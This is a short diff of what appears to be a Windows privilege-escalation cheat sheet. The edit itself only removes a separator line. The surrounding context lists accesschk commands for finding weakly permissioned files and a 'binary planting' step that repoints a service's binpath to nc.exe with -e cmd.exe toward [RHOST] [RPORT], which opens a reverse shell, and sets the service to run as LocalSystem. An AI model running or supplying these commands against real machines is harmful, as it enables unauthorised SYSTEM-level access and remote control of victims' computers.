@@ -102,7 +102,7 @@ accesschk.exe -uwdqs "[Group name you belong to]" c:\
 // Find all weak file permissions per drive.
 accesschk.exe -uwqs Users c:\*.*
 accesschk.exe -uwqs "[Group name you belong to]" c:\*.*
----
+
 // Binary planting
 sc config [service_name] binpath= "C:\nc.exe -nv [RHOST] [RPORT] -e C:\WINDOWS\System32\cmd.exe"
 sc config [service_name] obj= ".\LocalSystem" password= ""
